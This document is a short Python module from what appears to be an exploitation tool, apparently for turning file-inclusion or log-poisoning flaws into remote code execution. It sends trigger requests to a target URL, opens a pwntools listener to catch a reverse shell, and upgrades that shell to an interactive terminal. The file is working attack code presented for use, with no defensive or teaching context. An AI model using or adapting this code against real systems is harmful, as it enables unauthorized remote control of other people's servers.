from pwn import *
from utils import convert_string_to_dict
import requests
host = "0.0.0.0"

def shell_session(url, cookie, header, command, port, args):
    listener_thread = threading.Thread(target=start_listener, args=(port,), daemon=False)
    listener_thread.start()
    time.sleep(1)

    if args.input:
        try:
            requests.post(url=url, cookies=convert_string_to_dict(cookie), headers=header, data=command, timeout=10)
        except:
            pass

    if args.filter or args.data or args.authlog or args.accesslog:
        try:
            requests.get(url=url, cookies=convert_string_to_dict(cookie), headers=header, timeout=10)
        except:
            pass


def start_listener(port):
    listener = listen(port)
    print(f"[+] Listening on {host}:{listener.lport}...")
    conn = None

    try:
        conn = listener.wait_for_connection()

        conn.sendline(b"script /dev/null -c bash")
        conn.sendline(b"export TERM=xterm")
        conn.sendline(b"stty raw -echo")

        conn.interactive()

    except Exception as e:
        print(f"[!] Error while upgrading shell: {e}")
    finally:
        if conn is not None:
            print("[*] Shell session closed.")
            conn.close()
        listener.close()

    return True

